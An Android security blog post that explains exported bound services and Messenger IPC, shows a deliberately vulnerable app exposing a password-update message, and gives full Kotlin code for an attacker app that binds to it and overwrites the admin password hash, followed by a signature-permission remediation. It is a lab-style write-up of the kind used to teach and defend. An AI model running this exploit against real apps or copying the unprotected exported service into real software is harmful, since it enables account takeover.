<!doctype html><html lang=en-us><head><link rel=stylesheet href=/styles.css><link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>Exploiting Exported Services: IPC Messenger | Alberto Giust</title><link rel=canonical href=https://blog.alright21.me/security/exploiting_ipc_messenger/><meta name=description content="Hi, I am Alberto Giust, aka `alright(21)?`, penetration tester at Spike Reply and security enthusiast. In this website you will find CTF writeups and other interesting things I want to document about my journey through the magical world of Cybersecurity."><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="all,follow"><meta name=googlebot content="index,follow,snippet,archive"><meta property="og:url" content="https://blog.alright21.me/security/exploiting_ipc_messenger/"><meta property="og:site_name" content="Alberto Giust"><meta property="og:title" content="Exploiting Exported Services: IPC Messenger"><meta property="og:description" content="Hello everyone! It’s alright here. In this article we will explore the concepts of exported components, bound services, and IPC (Inter-Process Communication) in Android, what are the risks associated to them and how we can exploit them when misconfigured. I will share a vulnerable application based on a real life example I encountered during my daily job.
Prepare your Android knowledge and let’s get started.
What is a Service A Service is an application component used to perform actions in background. A service does not run on a separate process or a separate thread and does not need a user interface. They are used for sending notifications, manage audio playback or create persistent connection between multiple processes for service-client communication. In this article we will focus our study on bound services used for inter-process communication."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:published_time" content="2024-02-29T08:30:26+01:00"><meta property="article:modified_time" content="2024-02-29T08:30:26+01:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Exploiting Exported Services: IPC Messenger"><meta name=twitter:description content="Hello everyone! It’s alright here. In this article we will explore the concepts of exported components, bound services, and IPC (Inter-Process Communication) in Android, what are the risks associated to them and how we can exploit them when misconfigured. I will share a vulnerable application based on a real life example I encountered during my daily job.
Prepare your Android knowledge and let’s get started.
What is a Service A Service is an application component used to perform actions in background. A service does not run on a separate process or a separate thread and does not need a user interface. They are used for sending notifications, manage audio playback or create persistent connection between multiple processes for service-client communication. In this article we will focus our study on bound services used for inter-process communication."><link rel=stylesheet href=https://blog.alright21.me/css/styles.e282735e308195f4ba7bde9c23d7b770c438e682fdb8dd70ed9a1cc443b0ba4ce94a817547eb664fefe53bc615142aa923a0f8f94bb58b5f2441d213e6d7d0a9.css integrity="sha512-4oJzXjCBlfS6e96cI9e3cMQ45oL9uN1w7ZocxEOwukzpSoF1R+tmT+/lO8YVFCqpI6D4+Uu1i18kQdIT5tfQqQ=="><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script><script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><link rel=icon type=image/png href=https://blog.alright21.me/favicon.ico><div id=cookie-notice><span>We would like to use third party cookies and scripts to improve the
functionality of this website.</span>
<a id=cookie-notice-accept class="btn btn-primary btn-sm">Approve</a>
<a id=cookie-notice-deny class="btn btn-primary btn-sm">Deny</a>
<a href=/privacy id=cookie-notice-privacy class="btn btn-primary btn-sm">More info</a><br><span id=cookie-credits>Credits to this banner: <a id=cookie-notice-privacy href=https://github.com/Kudos01>Kudos01</a></div></div><script>function createCookie(e,t,n){var s,o="";n&&(s=new Date,s.setTime(s.getTime()+n*24*60*60*1e3),o="; expires="+s.toUTCString()),document.cookie=e+"="+t+o+"; path=/"}function readCookie(e){for(var t,s=e+"=",o=document.cookie.split(";"),n=0;n<o.length;n++){for(t=o[n];t.charAt(0)==" ";)t=t.substring(1,t.length);if(t.indexOf(s)==0)return t.substring(s.length,t.length)}return null}function eraseCookie(e){createCookie(e,"",-1)}if(readCookie("cookie-notice-option")=="true"){function loadScriptAsync(e,t){if(typeof t!="function")throw new Error("Not a valid callback for async script load");var n=document.createElement("script");n.onload=t,n.src=e,document.head.appendChild(n)}loadScriptAsync("https://www.googletagmanager.com/gtag/js?id=G-7KVTDGPL67",function(){window.dataLayer=window.dataLayer||[];function e(){dataLayer.push(arguments)}e("js",new Date),e("config","G-7KVTDGPL67",{anonymize_ip:!0})})}else readCookie("cookie-notice-option")!="false"&&(document.getElementById("cookie-notice").style.display="block");document.getElementById("cookie-notice-accept").addEventListener("click",function(){createCookie("cookie-notice-option","true",31),document.getElementById("cookie-notice").style.display="none",location.reload()}),document.getElementById("cookie-notice-deny").addEventListener("click",function(){createCookie("cookie-notice-option","false",31),document.getElementById("cookie-notice").style.display="none",location.reload()})</script></head><body class="max-width mx-auto px3 ltr"><div class="content index py4"><header id=header><a href=https://blog.alright21.me/><div id=logo style=background-image:url(https://blog.alright21.me/images/logo.png)></div><div id=title><h1>Alberto Giust</h1></div></a><div id=nav><ul><li class=icon><a href=# aria-label=Menu><i class="fas fa-bars fa-2x" aria-hidden=true></i></a></li><li><a href=/>Home</a></li><li><a href=/security>Security</a></li><li><a href=/ctf>CTFs</a></li><li><a href=/education>Education</a></li><li><a href=/dev>Dev</a></li><li><a href=/about>About</a></li></ul></div></header><article class=post itemscope itemtype=http://schema.org/BlogPosting><header><h1 class=posttitle itemprop="name headline">Exploiting Exported Services: IPC Messenger</h1><div class=meta><div class=postdate><time datetime="2024-02-29 08:30:26 +0100 +0100" itemprop=datePublished>2024-02-29</time></div><div class=article-read-time><i class="far fa-clock"></i>
6 minute read</div></div></header><div class=content itemprop=articleBody><p>Hello everyone! It&rsquo;s <code>alright</code> here. In this article we will explore the concepts of exported components, bound services, and IPC (Inter-Process Communication) in Android, what are the risks associated to them and how we can exploit them when misconfigured. I will share a vulnerable application based on a real life example I encountered during my daily job.</p><p>Prepare your Android knowledge and let&rsquo;s get started.</p><h2 id=what-is-a-service>What is a Service</h2><p>A <a href=https://developer.android.com/reference/android/app/Service><code>Service</code></a> is an application component used to perform actions in background. A service does not run on a separate process or a separate thread and does not need a user interface. They are used for sending notifications, manage audio playback or create persistent connection between multiple processes for service-client communication. In this article we will focus our study on bound services used for inter-process communication.</p><p><a href=https://developer.android.com/develop/background-work/services/bound-services>Bound services</a> are used to create a communication channel between app components or other processes and exchange data. This &ldquo;channel&rdquo; is created by calling <code>bindService()</code>, which is handled by <code>onBind()</code> callback.</p><p>Developers can use services inside the application context, but sometimes they are used across applications. In this case, services needs to be <code>android:exported=true</code>. However, other applications installed on the device become authorized to interact with exported components, posing a security risk in some situations. To bind to an exported service, we need to write another application and call <code>bindService()</code> method from that using an appropriate intent (implicit intents are deprecated in this case, so we need to write an explicit one).</p><h2 id=ipc-with-messsenger>IPC with Messsenger</h2><p>As said before, this article focuses on inter-process communication using services. Developers can achieve that with a <a href=https://developer.android.com/reference/android/os/Messenger>Messenger</a> (or AIDL, not covered here). A Messenger implements a Handler used to manage callbacks coming from the client using <code>handleMessage()</code>. When the Messenger instance is created, the server returns an IBinder to the client, which is used to instantiate the Messenger in the client side and to send Messages. You can see a detailed explanation <a href=https://developer.android.com/develop/background-work/services/bound-services#Messenger>here</a>.</p><p>In this example, we consider the application with the Service as the server, and the application that connects to it the client.</p><p>The <strong>server</strong> application implements the Service similarly to this example.</p><p><em>MessengerService.kt</em></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-kotlin data-lang=kotlin><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MessengerService</span> : Service() {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>lateinit</span> <span style=color:#66d9ef>var</span> mMessenger: Messenger
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>internal</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>IncomingHandler</span>(
</span></span><span style=display:flex><span>        looper: Looper,
</span></span><span style=display:flex><span>        context: Context,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>val</span> applicationContext: Context = context.applicationContext
</span></span><span style=display:flex><span>    ) : Handler(looper) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>override</span> <span style=color:#66d9ef>fun</span> <span style=color:#a6e22e>handleMessage</span>(msg: Message) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>when</span> (msg.what) {
</span></span><span style=display:flex><span>                MSG_SAY_HELLO <span style=color:#f92672>-&gt;</span> {
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>Toast</span>.makeText(
</span></span><span style=display:flex><span>                      applicationContext, <span style=color:#e6db74>&#34;hello!&#34;</span>, 
</span></span><span style=display:flex><span>                      <span style=color:#a6e22e>Toast</span>.LENGTH_SHORT).show()
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>Log</span>.d(<span style=color:#e6db74>&#34;MESSENGER&#34;</span>,<span style=color:#e6db74>&#34;HELLO&#34;</span>)
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>else</span> <span style=color:#f92672>-&gt;</span> <span style=color:#66d9ef>super</span>.handleMessage(msg)
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>override</span> <span style=color:#66d9ef>fun</span> <span style=color:#a6e22e>onBind</span>(intent: Intent): IBinder {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>Toast</span>.makeText(applicationContext, <span style=color:#e6db74>&#34;binding&#34;</span>, <span style=color:#a6e22e>Toast</span>.LENGTH_SHORT).show()
</span></span><span style=display:flex><span>        mMessenger = Messenger(IncomingHandler(<span style=color:#a6e22e>Looper</span>.getMainLooper(),<span style=color:#66d9ef>this</span>))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> mMessenger.binder
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><em>AndroidManifest.xml</em></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span>...
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;service</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;.MessengerService&#34;</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>android:enabled=</span><span style=color:#e6db74>&#34;true&#34;</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>android:exported=</span><span style=color:#e6db74>&#34;true&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;intent-filter&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;action</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;android.intent.action.MESSENGER&#34;</span> <span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;/intent-filter&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/service&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>The <strong>client</strong> application connects to the service using the <code>android.intent.action.MESSENGER</code> action with an explicit intent.</p><p><em>MainActivity.kt</em></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-kotlin data-lang=kotlin><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MainActivity</span> : AppCompatActivity() {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>var</span> mService: Messenger? = <span style=color:#66d9ef>null</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>var</span> bound: Boolean = <span style=color:#66d9ef>false</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>val</span> mConnection = <span style=color:#66d9ef>object</span> <span style=color:#960050;background-color:#1e0010>: </span><span style=color:#a6e22e>ServiceConnection</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>override</span> <span style=color:#66d9ef>fun</span> <span style=color:#a6e22e>onServiceConnected</span>(className: ComponentName, service: IBinder) {
</span></span><span style=display:flex><span>            mService = Messenger(service)
</span></span><span style=display:flex><span>            bound = <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// we can now send messages
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>override</span> <span style=color:#66d9ef>fun</span> <span style=color:#a6e22e>onServiceDisconnected</span>(className: ComponentName) {
</span></span><span style=display:flex><span>            mService = <span style=color:#66d9ef>null</span>
</span></span><span style=display:flex><span>            bound = <span style=color:#66d9ef>false</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>override</span> <span style=color:#66d9ef>fun</span> <span style=color:#a6e22e>onStop</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>super</span>.onStop()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (bound) {
</span></span><span style=display:flex><span>            unbindService(mConnection)
</span></span><span style=display:flex><span>            bound = <span style=color:#66d9ef>false</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>override</span> <span style=color:#66d9ef>fun</span> <span style=color:#a6e22e>onCreate</span>(savedInstanceState: Bundle?) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>super</span>.onCreate(savedInstanceState)
</span></span><span style=display:flex><span>        setContentView(<span style=color:#a6e22e>R</span>.layout.activity_main)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Intent(<span style=color:#e6db74>&#34;android.intent.action.MESSENGER&#34;</span>)
</span></span><span style=display:flex><span>        .setPackage(<span style=color:#e6db74>&#34;com.alright.serviceserver&#34;</span>)
</span></span><span style=display:flex><span>        .also { intent <span style=color:#f92672>-&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>val</span>  res = bindService(intent, mConnection, <span style=color:#a6e22e>Context</span>.BIND_AUTO_CREATE)
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>Log</span>.e(<span style=color:#e6db74>&#34;bound&#34;</span>, res.toString())
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=vulnerable-scenario>Vulnerable Scenario</h2><p>Now that we have defined the components we can see how to exploit this weakness in a real-life example. What I found during my studies was an application that exposed a service to other application in order to execute some actions on the app. The purpose of this setup was for remotely control the app from the web. There was another application that served as a &ldquo;proxy&rdquo; from the web to the victim application. This application implements a Service that receives messages and, based on <code>msg.what</code>, it performs action. This application had a reserved area protected by a password, which could be updated remotely using the application &ldquo;proxy&rdquo;. Here is the design.</p><figure><img src=/assets/messenger_design.png alt="Messenger App Design" style=width:30%><figcaption>Messenger Application Design</figcaption></figure><p>As you may have already noticed, there is a problem with this design: any other application can act as the &ldquo;proxy&rdquo; and send messages to the Victim Service App.</p><h3 id=exploitation>Exploitation</h3><p>I created a similar vulnerable application and the attacker application: you can find it on <a href=https://github.com/alright21/exploit-messenger>github</a>. If you want to solve it by yourself, just install the <em>ServiceServer</em> app and try to code the <em>ServiceClient</em> app.</p><p>The application has a simple login page, where we can try to input some parameters, but we are not able to find any info here.</p><figure><img src=/assets/messenger_app_login.png alt="Messenger App Login" style=width:50%><figcaption>Messenger Application Login Page</figcaption></figure><p>Let&rsquo;s start by having a look at the application with <code>Jadx-gui</code>. The app has three main classes: <em>MainActivity</em>, <em>AdminPageActivity</em> and <em>MessengerService</em>.</p><figure><img src=/assets/messenger_app_structure.png alt="Messenger App Structure" style=width:50%><figcaption>Messenger Application Structure</figcaption></figure><p>The <em>MainActivity</em> initialize the <em>sharedPreferences</em> file with the username and the password hash of the login. Here we can see that the username is <code>root</code>. In fact, if we try this username with a random password, we get a Toast message saying &ldquo;Incorrect Password&rdquo;. Half of the job done.</p><figure><img src=/assets/messenger_app_prefs.png alt="Messenger App Preferences" style=width:100%><figcaption>Messenger Application sharedPreferences</figcaption></figure><p>In this example, the original password is a <code>sha256</code> hash, so we could crack it if the password is weak, but this is not the case (if you can crack it, let me know ahah). We have to find another way to bypass this page.</p><p>Let&rsquo;s have a look at the <em>MessengerService</em> class, where the Service is implemented. Inside the <em>AndroidManifest.xml</em> we can see that this service is <code>exported</code> and accepts an intent with action name <code>android.intent.action.MESSENGER</code>.</p><p>The Service implements the <code>handleMessage()</code> callback and accepts two type of <code>what</code>:</p><ul><li><code>1</code>: creates a Toast message and displays it</li><li><code>2</code>: updates the password with a new hash</li></ul><p>You probably already know where we are going: we need to send a message to the service with a known password hash in order to update the password and enter the administration page. How we can do it?</p><p>We need to create a malicious application that interacts with the service, binds to it, and sends a message containing the new password hash. Based on the information we detailed above, the process of creating the application should be quite easy. Here is an example of the code we can use.</p><p><em>MainActivity.kt</em></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-kotlin data-lang=kotlin><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MainActivity</span> : AppCompatActivity() {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>var</span> mService: Messenger? = <span style=color:#66d9ef>null</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>var</span> bound: Boolean = <span style=color:#66d9ef>false</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>val</span> mConnection = <span style=color:#66d9ef>object</span> <span style=color:#960050;background-color:#1e0010>: </span><span style=color:#a6e22e>ServiceConnection</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>override</span> <span style=color:#66d9ef>fun</span> <span style=color:#a6e22e>onServiceConnected</span>(className: ComponentName, service: IBinder) {
</span></span><span style=display:flex><span>            mService = Messenger(service)
</span></span><span style=display:flex><span>            bound = <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>            updatePassword()
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>override</span> <span style=color:#66d9ef>fun</span> <span style=color:#a6e22e>onServiceDisconnected</span>(className: ComponentName) {
</span></span><span style=display:flex><span>            mService = <span style=color:#66d9ef>null</span>
</span></span><span style=display:flex><span>            bound = <span style=color:#66d9ef>false</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>fun</span> <span style=color:#a6e22e>updatePassword</span>(){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (!bound) <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>val</span> msg: Message = <span style=color:#a6e22e>Message</span>.obtain(<span style=color:#66d9ef>null</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>val</span> data = Bundle()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>data</span>.putString(<span style=color:#e6db74>&#34;hash&#34;</span>,<span style=color:#e6db74>&#34;2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        msg.<span style=color:#66d9ef>data</span> = <span style=color:#66d9ef>data</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            mService<span style=color:#f92672>?.</span>send(msg)
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>Toast</span>.makeText(<span style=color:#66d9ef>this</span>,<span style=color:#e6db74>&#34;Password Updated&#34;</span>, <span style=color:#a6e22e>Toast</span>.LENGTH_SHORT)
</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>catch</span> (e:RemoteException){
</span></span><span style=display:flex><span>            e.printStackTrace()
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>override</span> <span style=color:#66d9ef>fun</span> <span style=color:#a6e22e>onStop</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>super</span>.onStop()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (bound) {
</span></span><span style=display:flex><span>            unbindService(mConnection)
</span></span><span style=display:flex><span>            bound = <span style=color:#66d9ef>false</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>override</span> <span style=color:#66d9ef>fun</span> <span style=color:#a6e22e>onCreate</span>(savedInstanceState: Bundle?) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>super</span>.onCreate(savedInstanceState)
</span></span><span style=display:flex><span>        setContentView(<span style=color:#a6e22e>R</span>.layout.activity_main)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Intent(<span style=color:#e6db74>&#34;android.intent.action.MESSENGER&#34;</span>).setPackage(<span style=color:#e6db74>&#34;com.alright.serviceserver&#34;</span>).also { intent <span style=color:#f92672>-&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>val</span>  res = bindService(intent, mConnection, <span style=color:#a6e22e>Context</span>.BIND_AUTO_CREATE)
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>Log</span>.e(<span style=color:#e6db74>&#34;bound&#34;</span>, res.toString())
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>From Android 11, we also need to add a <code>queries</code> tag inside the attacker application, in order to list the application we want to interact to.</p><p><em>AndroidManifest.xml</em></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;queries&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;package</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;com.alright.serviceserver&#34;</span> <span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/queries&gt;</span>
</span></span></code></pre></div><p>By running the application, we will see a Toast message saying that the password has been updated. The attack is done! We updated the password with a well-known hash, so we can easily log in into the application.</p><h2 id=remediation>Remediation</h2><p>Ok, the attack is cool, and the easy solution could be to not export the Service. However, it is necessary to export it when we need to do IPC between application. So, how can we protect our application?</p><p>As shown in the <a href=https://developer.android.com/privacy-and-security/security-tips#interprocess-communication>Android Developers</a> page, we can add a row inside the Manifest to only allow applications with the same signature to access and bind to the service (use <code>signature-level</code> permission inside <code>android:protectionLevel</code>).</p><p>And that&rsquo;s all for today! If you have any questions or doubts just let me know:)</p><h2 id=references>References</h2><ul><li><a href=https://developer.android.com/reference/android/app/Service>https://developer.android.com/reference/android/app/Service</a></li><li><a href=https://developer.android.com/develop/background-work/services>https://developer.android.com/develop/background-work/services</a></li><li><a href=https://developer.android.com/develop/background-work/services/bound-services#kotlin>https://developer.android.com/develop/background-work/services/bound-services#kotlin</a></li><li><a href=https://developer.android.com/develop/background-work/services/bound-services#Messenger>https://developer.android.com/develop/background-work/services/bound-services#Messenger</a></li><li><a href=https://proandroiddev.com/ipc-techniques-for-android-messenger-3e8555a32167>https://proandroiddev.com/ipc-techniques-for-android-messenger-3e8555a32167</a></li><li><a href=https://github.com/perihanmirkelam/IPC-Examples>https://github.com/perihanmirkelam/IPC-Examples</a></li><li><a href=https://developer.android.com/privacy-and-security/security-tips#services>https://developer.android.com/privacy-and-security/security-tips#services</a></li><li><a href=https://github.com/alright21/exploit-messenger>https://github.com/alright21/exploit-messenger</a></li></ul></div></article><footer id=footer><div class=footer-left>Copyright &copy; 2025 Alberto Giust</div><div class=footer-right><nav><ul><li><a href=/>Home</a></li><li><a href=/security>Security</a></li><li><a href=/ctf>CTFs</a></li><li><a href=/education>Education</a></li><li><a href=/dev>Dev</a></li><li><a href=/about>About</a></li></ul></nav></div></footer></div></body><link rel=stylesheet href=/lib/font-awesome/css/all.min.css><script src=/lib/jquery/jquery.min.js></script><script src=/js/main.js></script></html>